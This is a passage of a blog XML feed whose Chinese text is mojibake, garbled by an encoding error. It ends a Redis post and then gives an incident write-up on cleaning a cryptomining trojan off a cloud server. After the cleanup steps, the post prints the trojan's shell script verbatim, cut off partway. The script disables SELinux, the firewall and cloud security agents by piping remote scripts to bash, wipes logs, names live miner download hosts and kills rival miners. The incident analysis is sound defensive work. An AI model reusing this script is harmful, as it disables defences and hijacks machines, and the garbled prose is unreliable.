<tbody><tr>
<td>æ‰¹é‡æ‰§è¡Œå‘½ä»¤</td>
<td>æ”¯æŒ</td>
<td>æ”¯æŒ</td>
</tr>
<tr>
<td>ä¿è¯åŸå­æ€§</td>
<td>ä¸æ”¯æŒ</td>
<td>æ”¯æŒ</td>
</tr>
<tr>
<td>å¹²é¢„å‘½ä»¤æ‰§è¡Œé€»è¾‘</td>
<td>ä¸æ”¯æŒ</td>
<td>æ”¯æŒ</td>
</tr>
</tbody></table>
<p>æ•´ä½“æ¥è¯´ï¼ŒLuaè„šæœ¬æ›´åŠ çš„çµæ´»ï¼Œå› ä¸ºæ˜¯è„šæœ¬ï¼Œæ‰€ä»¥ä½ å¯ä»¥éšå¿ƒæ‰€æ¬²çš„æ§åˆ¶å„ä¸ªå‘½ä»¤ä¹‹é—´çš„æ‰§è¡Œé€»è¾‘ï¼Œä»¥åŠå¤„ç†å®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒLuaæ˜¯ä¿è¯åŸå­æ€§çš„ï¼Œæ‰€ä»¥åœ¨ä¸€äº›ç‰¹å®šåœºæ™¯ï¼Œåªæœ‰å®ƒæ‰èƒ½èƒœä»»ã€‚è€ŒPipelineç®¡é“ï¼Œæ›´å¤šçš„æ˜¯ä¸ºäº†è§£å†³RTTå¸¦æ¥çš„é—®é¢˜ã€‚</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>åˆ†å¸ƒå¼ç¼“å­˜</tag>
        <tag>ç¼“å­˜</tag>
        <tag>nosql</tag>
        <tag>ç®¡é“</tag>
      </tags>
  </entry>
  <entry>
    <title>æœºå™¨è¢«æŒ–çŸ¿ï¼æ€ä¹ˆè§£ï¼Ÿ</title>
    <url>/2021/02/09/linux-kill-mining-attack/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä»Šå¤©ä¸Šåˆï¼Œçªç„¶å‘ç°ECSä¸Šçš„ä¸€äº›æœåŠ¡æ— æ³•è®¿é—®ï¼Œè€Œèƒ½è®¿é—®çš„ï¼Œè¯·æ±‚å“åº”ä¹Ÿå¾ˆæ…¢ï¼Œå›æƒ³äº†ä¸€ä¸‹ï¼Œå¥½åƒä¹Ÿæ²¡è·‘ä»€ä¹ˆèƒ½ä½¿å†…å­˜æˆ–cpuæš´æ¶¨çš„ç¨‹åºå•Šã€‚<br>äºæ˜¯ï¼Œç«‹é©¬æŠ„ä¸Šæˆ‘çš„äºŒæ‰‹macç™»å½•æœåŠ¡å™¨ï¼Œå¥½å®¶ä¼™ï¼Œå‘ç°éƒ¨åˆ†è¿›ç¨‹è¢«æ€æ­»ï¼Œcpuä¹Ÿé£™äº†åˆ°100%ï¼Œç»é€¼æ˜¯è¢«æ¤å…¥äº†æ¶æ„æœ¨é©¬å‘€ã€‚</p>
<p>æ‰§è¡Œ<code>htop</code>ä¸€çœ‹ï¼Œä¾¿å‘ç°äº†è¿™ä¸ªæ¶æ„è¿›ç¨‹ï¼Œæ ¹æ®è¿›ç¨‹çš„commandä¿¡æ¯æ‰¾åˆ°äº†ä¸€äº›å…³é”®å†…å®¹ï¼š<code>stratum+tcp://xmr-asia1.nanopool.org:14444</code>ï¼Œè¿™å°¼ç›ä¸å°±æ˜¯çŸ¿æ± åœ°å€å—ï¼Œçœ‹æ¥æ˜¯è¢«æ¤å…¥äº†æŒ–çŸ¿æœ¨é©¬ï¼Œæˆäº†äººå®¶çš„å…è´¹åŠ³åŠ¨åŠ›å•Šã€‚</p>
<h3 id="æœ¨é©¬æŸ¥æ€"><a href="#æœ¨é©¬æŸ¥æ€" class="headerlink" title="æœ¨é©¬æŸ¥æ€"></a>æœ¨é©¬æŸ¥æ€</h3><p>çŸ¥é“é—®é¢˜åŸå› åï¼Œè§£å†³èµ·æ¥å°±å¾ˆå®¹æ˜“äº†ï¼Œé¦–å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰æ¶æ„çš„å®šæ—¶ä»»åŠ¡ï¼Œå…ˆæ¶ˆç­æ‰ï¼Œå¦åˆ™æŸ¥æ€è¿›ç¨‹èµ·ä¸äº†ä»€ä¹ˆä½œç”¨ï¼Œæ¶ˆåœä¸€ä¼šå°±æ¢ä¸ªè¿›ç¨‹ç»§ç»­ä¸Šæ¼”äº†ã€‚</p>
<p>1ï¼Œåˆ°/var/spool/cronç›®å½•ï¼ŒæŸ¥çœ‹å®šæ—¶ä»»åŠ¡</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/spool/cron</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>å‘ç°å¤šäº†ä¸€ä¸ªrootæ–‡ä»¶ï¼Œ<code>cat root</code>çœ‹äº†ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;30 * * * * sh &#x2F;etc&#x2F;newinit.sh &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>ä»»åŠ¡å†…å®¹ï¼šæ¯30ç§’ï¼Œè¿è¡Œä¸€æ¬¡/etc/newinit.shè„šæœ¬</p>
<p><code>sudo rm -rf root</code>:æƒé™ä¸è¶³ï¼å‘µå‘µï¼Œä¸æ€¥ï¼Œåº”è¯¥æ˜¯è¢«è®¾ç½®æ¥é”å®šå±æ€§æ¥ï¼Œä¸€ä¼šå†æ¥æ”¶æ‹¾å®ƒã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf root</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼šrm: cannot remove â€˜rootâ€™: Permission denied</span><br></pre></td></tr></table></figure>
<p>2ï¼Œæ‰§è¡Œ<code>/etc/newinit.sh</code>æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå§æ§½ï¼Œç¬é—´è„¸å°±ç»¿äº†ï¼TMDï¼Œå„ç§æˆæƒã€å„ç§åˆ ã€å„ç§æŸ¥æ€å’Œå®‰è£…ï¼Œæ–‡ä»¶å±æ€§ä¹Ÿæ”¹äº†ä¸€å †ã€‚</p>
<p>æ¯”å¦‚è„šæœ¬ç›´æ¥æŠŠcurlæ›¿æ¢ä¸ºcd1ï¼Œwgetæ›¿æ¢ä¸ºwd1ç­‰ç­‰æ¶å¿ƒçš„æ“ä½œï¼Œè¿˜æœ‰å…¶ä»–é‡è¦çš„ä¿¡æ¯è¢«ç¯¡æ”¹ï¼Œè¿™TMDè‰¯å¿ƒè¢«ç‹—åƒäº†ä¹ˆï¼Ÿ</p>
<p>æ¢å¤èµ·æ¥éš¾åº¦ä¸å°ï¼Œæ˜¯åœ¨å¤ªéº»çƒ¦çš„æƒ…å†µä¸‹ï¼Œé‚£å°±å¹²è„†é€‰æ‹©é‡è£…ç³»ç»Ÿå§ã€‚</p>
<p>å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;curl &#x2F;usr&#x2F;bin&#x2F;url</span><br><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;url &#x2F;usr&#x2F;bin&#x2F;cd1</span><br><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;wget &#x2F;usr&#x2F;bin&#x2F;get</span><br><span class="line">mv &#x2F;usr&#x2F;bin&#x2F;get &#x2F;usr&#x2F;bin&#x2F;wd1</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œå‘½ä»¤åˆ é™¤æ–‡ä»¶ï¼Œæç¤ºä¸èƒ½åˆ é™¤ï¼Œåº”è¯¥ä¹Ÿæ˜¯è¢«é”å®šäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;etc&#x2F;newinit.sh</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼šrm: cannot remove â€˜&#x2F;etc&#x2F;newinit.shâ€™: Operation not permitted</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨<code>lsattr</code>å‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼ŒæŸ¥çœ‹æ–‡ä»¶å±æ€§ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsattr &#x2F;etc&#x2F;newinit.sh</span><br><span class="line"></span><br><span class="line">è¾“å‡ºï¼š----ia-------e-- newinit.sh</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šé€šè¿‡å‘½ä»¤ <code>chattr</code> å¯ä»¥è®¾ç½®æ–‡ä»¶/æ–‡ä»¶å¤¹çš„éšè—å±æ€§ï¼Œæ¥ä¿è¯æ–‡ä»¶/æ–‡ä»¶å¤¹çš„å®‰å…¨ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„å‚æ•°ä¸ºiå’Œaï¼Œè¿™ä¸¤ä¸ªå±æ€§åªæœ‰rootç”¨æˆ·æ‰å¯ä»¥è®¾ç½®æˆ–æ¸…é™¤ã€‚</p>
<p>å¾ˆå¥½ï¼ç§»é™¤æ–‡ä»¶å±æ€§ï¼Œå†æ¬¡åˆ é™¤æ–‡ä»¶ï¼Œæå®šï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr -ia /etc/newinit.sh </span><br><span class="line">rm -rf /etc/newinit.sh</span><br></pre></td></tr></table></figure>
<p>åˆšæ‰è„šæœ¬é‡Œçš„lock_cron()å‡½æ•°é”å®šäº†å®šæ—¶ä»»åŠ¡çš„å¥½å‡ ä¸ªç›®å½•ï¼Œä¹Ÿæä¾›äº†unlock_cron()å‡½æ•°ç”¨æ¥æ¸…é™¤å±æ€§ï¼Œé‚£æ­£å¥½ï¼Œå°±æ‹·è´è¿™ä¸ªå‡½æ•°é‡Œçš„å‘½ä»¤ï¼ŒæŠŠå®ƒè®¾ç½®çš„éƒ½æ¸…é™¤ï¼Œçœå¾—éº»çƒ¦ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chattr -R -ia /var/spool/cron</span><br><span class="line">chattr -ia /etc/crontab</span><br><span class="line">chattr -R -ia /var/spool/cron/crontabs</span><br><span class="line">chattr -R -ia /etc/cron.d</span><br><span class="line"></span><br><span class="line">chattr -ia /var/spool/cron/root</span><br><span class="line">rm -rf /var/spool/cron/root</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­æŸ¥çœ‹æ˜¯å¦å­˜åœ¨è¿æ¥åˆ°æœªçŸ¥å¤–ç½‘çš„ç½‘ç»œè¿çº¿ï¼Œå°†å…¶æŸ¥æ€ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -anptl</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1063&#x2F;sshd           </span><br><span class="line">tcp        0      0 172.19.239.108:43542    139.99.102.73:14444     ESTABLISHED 458&#x2F;[crypto]        </span><br><span class="line">tcp        0     64 172.19.239.108:22       115.238.42.142:56001    ESTABLISHED 1104&#x2F;sshd: root@pts </span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°æœªçŸ¥è¿çº¿cryptoï¼ŒæŸ¥æ€ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm -rf \[crypto\].sh</span><br><span class="line">rm -rf \[crypto\]</span><br><span class="line">rm -rf \[crypto\].<span class="built_in">log</span> </span><br><span class="line">rm -rf \[crypto\].pid </span><br></pre></td></tr></table></figure>
<p>æœ€åï¼Œæ€æ‰è¿è¡Œçš„è¿›ç¨‹å³å¯ï¼Œæˆ–è€…é‡å¯ä¸‹æœåŠ¡å™¨ä¹Ÿè¡Œï¼Œå…¶ä»–è¢«ç¯¡æ”¹çš„å†…å®¹ï¼Œè‡ªå·±çœ‹ç€åŠå§ï¼Œè™½ç„¶æ“ä½œå¾ˆå¤šï¼Œå¯¹æœºå™¨ä¹Ÿæ²¡å•¥å½±å“ã€‚</p>
<h4 id="è„šæœ¬é™„ä»¶"><a href="#è„šæœ¬é™„ä»¶" class="headerlink" title="è„šæœ¬é™„ä»¶"></a>è„šæœ¬é™„ä»¶</h4><p>æœ€åï¼Œé™„ä¸Šæœ¨é©¬è„šæœ¬çš„å†…å®¹ï¼Œè¯·å‹¿å°è¯•è¿è¡Œï¼è§‚æ‘©ä¸‹å°±å¥½ï¼Œä¹Ÿè®¸å“ªå¤©ä¹Ÿç”¨å¾—ä¸Š:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">setenforce 0 2&gt;dev/null</span><br><span class="line"><span class="built_in">echo</span> SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/null</span><br><span class="line">sync &amp;&amp; <span class="built_in">echo</span> 3 &gt;/proc/sys/vm/drop_caches</span><br><span class="line">crondir=<span class="string">&#x27;/var/spool/cron/&#x27;</span><span class="string">&quot;<span class="variable">$USER</span>&quot;</span></span><br><span class="line">cont=`cat <span class="variable">$&#123;crondir&#125;</span>`</span><br><span class="line">ssht=`cat /root/.ssh/authorized_keys`</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /etc/zzhs</span><br><span class="line">rtdir=<span class="string">&quot;/etc/zzhs&quot;</span></span><br><span class="line">bbdir=<span class="string">&quot;/usr/bin/curl&quot;</span></span><br><span class="line">bbdira=<span class="string">&quot;/usr/bin/cd1&quot;</span></span><br><span class="line">ccdir=<span class="string">&quot;/usr/bin/wget&quot;</span></span><br><span class="line">ccdira=<span class="string">&quot;/usr/bin/wd1&quot;</span></span><br><span class="line">mv /usr/bin/curl /usr/bin/url</span><br><span class="line">mv /usr/bin/url /usr/bin/cd1</span><br><span class="line">mv /usr/bin/wget /usr/bin/get</span><br><span class="line">mv /usr/bin/get /usr/bin/wd1</span><br><span class="line"><span class="built_in">ulimit</span> -n 65535</span><br><span class="line">rm -rf /var/<span class="built_in">log</span>/syslog</span><br><span class="line">chattr -iua /tmp/</span><br><span class="line">chattr -iua /var/tmp/</span><br><span class="line">ufw <span class="built_in">disable</span></span><br><span class="line">iptables -F</span><br><span class="line"><span class="comment">#sudo sysctl kernel.nmi_watchdog=0</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;0&#x27;</span> &gt;/proc/sys/kernel/nmi_watchdog</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;kernel.nmi_watchdog=0&#x27;</span> &gt;&gt;/etc/sysctl.conf</span><br><span class="line">userdel akay</span><br><span class="line">userdel vfinder</span><br><span class="line">rm -rf /tmp/addres*</span><br><span class="line">rm -rf /tmp/walle*</span><br><span class="line">rm -rf /tmp/keys</span><br><span class="line"><span class="keyword">if</span> ps aux | grep -i <span class="string">&#x27;[a]liyun&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdir</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/uninstall.sh | bash</span><br><span class="line">  <span class="variable">$bbdira</span> http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash</span><br><span class="line">  pkill aliyun-service</span><br><span class="line">  rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service</span><br><span class="line">  rm -rf /usr/<span class="built_in">local</span>/aegis*</span><br><span class="line">  systemctl stop aliyun.service</span><br><span class="line">  systemctl <span class="built_in">disable</span> aliyun.service</span><br><span class="line">  service bcm-agent stop</span><br><span class="line">  yum remove bcm-agent -y</span><br><span class="line">  apt-get remove bcm-agent -y</span><br><span class="line"><span class="keyword">elif</span> ps aux | grep -i <span class="string">&#x27;[y]unjing&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/stargate/admin/uninstall.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/YunJing/uninst.sh</span><br><span class="line">  /usr/<span class="built_in">local</span>/qcloud/monitor/barad/admin/uninstall.sh</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">miner_url=<span class="string">&quot;http://106.15.74.113/b2f628/zzh&quot;</span></span><br><span class="line">miner_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/zzh&quot;</span></span><br><span class="line">miner_size=<span class="string">&quot;7600464&quot;</span></span><br><span class="line">sh_url=<span class="string">&quot;http://106.15.74.113/b2f628/newinit.sh&quot;</span></span><br><span class="line">sh_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/newinit.sh&quot;</span></span><br><span class="line">config_url=<span class="string">&quot;http://106.15.74.113/b2f628/config.json&quot;</span></span><br><span class="line">config_url_backup=<span class="string">&quot;http://104.244.76.33/b2f628/config.json&quot;</span></span><br><span class="line">config_size=<span class="string">&quot;2752&quot;</span></span><br><span class="line">chattr_size=<span class="string">&quot;8000&quot;</span></span><br><span class="line">rm -f /tmp/.null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 128 &gt; /proc/sys/vm/nr_hugepages</span><br><span class="line">sysctl -w vm.nr_hugepages=128</span><br><span class="line"></span><br><span class="line">kill_miner_proc()</span><br><span class="line">&#123;</span><br><span class="line">netstat -anp | grep 185.71.65.238 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep 140.82.52.87 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :23 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :443 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :143 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :2222 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3333 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3389 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :5555 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6666 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6665 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :6667 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :7777 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :8444 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">netstat -anp | grep :3347 | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | awk -F<span class="string">&#x27;[/]&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | grep -v <span class="string">&quot;-&quot;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:3333&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;:5555&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;kworker -c\&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;log_&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;systemten&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;netns&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;voltuned&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;darwin&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/dl&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ddg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/pprt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/ppol&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/65ccE*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/jmx*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;/tmp/2Ne80*&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;IOFoqIgyC0zmf2UR&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;45.76.122.92&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.38.191.178&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;51.15.56.161&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;86s.jpg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;aGTSGJJp&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;nMrfmnRa&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;PuNY5tm2&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;I0r8Jyyt&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;AgdgACUD&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;uiZvwxG8&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;hahwNEdB&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;BtwXn5qH&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3XEzey2T&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;t2tKrCSZ&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;svc&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;HD7fcBgg&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;zXcDajSs&#x27;</span> | awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | xargs -I % <span class="built_in">kill</span> -9 %</span><br><span class="line">ps aux | grep -v grep | grep <span class="string">&#x27;3lmigMo&#x27;</span> | awk <span class="string">&#x27;&#123;print 